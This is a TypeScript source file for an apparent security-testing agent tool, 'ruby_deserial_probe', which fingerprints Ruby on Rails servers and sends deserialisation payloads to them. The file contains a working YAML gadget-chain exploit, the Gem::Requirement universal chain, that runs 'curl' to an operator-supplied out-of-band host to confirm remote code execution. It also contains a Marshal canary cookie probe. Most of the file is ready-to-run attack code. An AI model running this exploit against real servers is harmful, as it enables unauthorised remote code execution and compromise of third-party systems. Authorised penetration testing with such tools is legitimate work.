// T44 — ruby_deserial_probe
// Ruby deserialisation: Marshal.load, YAML !ruby/object, ERB injection.

import { ToolDefinition, ToolResult } from '../types';
import { CommandExecutor } from '../executor';

const definition: ToolDefinition = {
  name: 'ruby_deserial_probe',
  description:
    'Ruby deserialisation attack suite. Tests Marshal.load (magic bytes \\x04\\x08), ' +
    'YAML !ruby/object gadgets, and ERB template injection via Marshal. Detection: ' +
    'Ruby on Rails stack, X-Runtime header, .rb endpoints, _session_id cookies.',
  status: 'available',
  version: '1.0.0',
  parameters: [
    { name: 'url',         type: 'string', required: true,  description: 'Target URL' },
    { name: 'cookie_name', type: 'string', required: false, description: 'Cookie name to probe', default: '_session_id' },
    { name: 'oob_host',    type: 'string', required: true,  description: 'OOB callback host for RCE confirmation' },
    { name: 'headers',     type: 'string', required: false, description: 'JSON extra headers' },
    { name: 'timeout_ms',  type: 'number', required: false, description: 'Per-request timeout ms', default: 15000 },
  ],
};

// Ruby Marshal magic bytes: \x04\x08 (version 4.8)
const MARSHAL_MAGIC_B64 = Buffer.from('\x04\x08').toString('base64');

// YAML gadget chains for Ruby
const YAML_PAYLOADS = (oobHost: string) => [
  {
    name: 'ruby_object_system',
    payload: `--- !ruby/object:Gem::Requirement\nrequirements:\n  - !ruby/object:Gem::Package::TarReader\n    io: &1 !ruby/object:Net::BufferedIO\n      io: &2 !ruby/object:Gem::Package::TarReader::Entry\n        read: 0\n        header: "abc"\n      debug_output: &3 !ruby/object:Net::WriteAdapter\n        socket: &4 !ruby/object:Gem::RequestSet\n          sets: !ruby/object:Net::WriteAdapter\n            socket: !ruby/object:Gem::SpecFetcher\n              sources: !ruby/object:Gem::Source::SpecificFile\n                spec: &5 !ruby/object:Gem::StubSpecification\n                  loaded_from: "| curl ${oobHost}/ruby-yaml-rce |"\n            method_id: :resolve\n          git_set: "exec"\n        method_id: :open\n`,
    note: 'Universal Gem chain → system command',
  },
];

async function detectRuby(url: string, headers: Record<string, string>, timeoutMs: number): Promise<{ is_ruby: boolean; has_session: boolean; rails_version: string }> {
  try {
    const controller = new AbortController();
    const timer = setTimeout(() => controller.abort(), timeoutMs);
    const resp = await fetch(url, { headers, signal: controller.signal });
    clearTimeout(timer);
    const xRuntime = resp.headers.get('x-runtime') || '';
    const setCookie = resp.headers.get('set-cookie') || '';
    const poweredBy = resp.headers.get('x-powered-by') || '';
    const isRuby = !!xRuntime || setCookie.includes('_session_id') || url.includes('.rb') || poweredBy.toLowerCase().includes('passenger') || poweredBy.toLowerCase().includes('phusion');
    return { is_ruby: isRuby, has_session: setCookie.includes('_session_id'), rails_version: xRuntime || 'unknown' };
  } catch {
    return { is_ruby: false, has_session: false, rails_version: 'unknown' };
  }
}

export const rubyDeserialProbeTool = {
  definition,
  async execute(params: Record<string, unknown>, _exec: CommandExecutor): Promise<ToolResult> {
    const url = String(params.url || '');
    const cookieName = String(params.cookie_name || '_session_id');
    const oobHost = String(params.oob_host || '');
    const timeoutMs = Number(params.timeout_ms || 15000);

    if (!url) return { output: 'url required', parsed: { error: 'missing_url' } };
    if (!oobHost) return { output: 'oob_host required', parsed: { error: 'missing_oob_host' } };

    let headers: Record<string, string> = { 'User-Agent': 'Mozilla/5.0 GENESIS/4.0' };
    try { if (params.headers) Object.assign(headers, JSON.parse(String(params.headers))); } catch { /* ignore */ }

    const detection = await detectRuby(url, headers, timeoutMs);
    const yamlPayloads = YAML_PAYLOADS(oobHost);

    const results: Array<{ name: string; status: number; interesting: boolean; error?: string }> = [];

    // Marshal canary probe
    try {
      const controller = new AbortController();
      const timer = setTimeout(() => controller.abort(), timeoutMs);
      const resp = await fetch(url, { headers: { ...headers, 'Cookie': `${cookieName}=${MARSHAL_MAGIC_B64}xxxx` }, signal: controller.signal });
      clearTimeout(timer);
      const text = await resp.text();
      const interesting = /marshal|TypeError|NoMethodError|ArgumentError/i.test(text) || resp.status >= 500;
      results.push({ name: 'marshal_canary', status: resp.status, interesting });
    } catch (err) {
      results.push({ name: 'marshal_canary', status: 0, interesting: false, error: String(err) });
    }

    // YAML probes
    for (const p of yamlPayloads) {
      try {
        const controller = new AbortController();
        const timer = setTimeout(() => controller.abort(), timeoutMs);
        const resp = await fetch(url, { method: 'POST', headers: { ...headers, 'Content-Type': 'application/x-yaml', 'Cookie': `${cookieName}=yaml` }, body: p.payload, signal: controller.signal });
        clearTimeout(timer);
        const text = await resp.text();
        const interesting = resp.status >= 500 || /yaml|gem|exception/i.test(text);
        results.push({ name: p.name, status: resp.status, interesting });
      } catch (err) {
        results.push({ name: p.name, status: 0, interesting: false, error: String(err) });
      }
    }

    const interesting = results.filter(r => r.interesting);
    const lines = [
      `ruby_deserial_probe — ${url.substring(0, 80)}`,
      `Ruby/Rails detected: ${detection.is_ruby}  X-Runtime: ${detection.rails_version}`,
      `Interesting responses: ${interesting.length}/${results.length}`,
      '─'.repeat(72),
    ];
    for (const r of results) {
      const flag = r.interesting ? '⚡ INTERESTING' : (r.error ? '✗ ERR        ' : '  ·          ');
      lines.push(`  ${flag}  [${r.name.padEnd(24)}]  status=${r.status}`);
    }
    lines.push('');
    lines.push(`MONITOR OOB: call oob_check(action=check) to verify ${oobHost} received callback`);

    return {
      output: lines.join('\n'),
      parsed: { detection, probe_results: results, interesting_count: interesting.length },
    };
  },
};
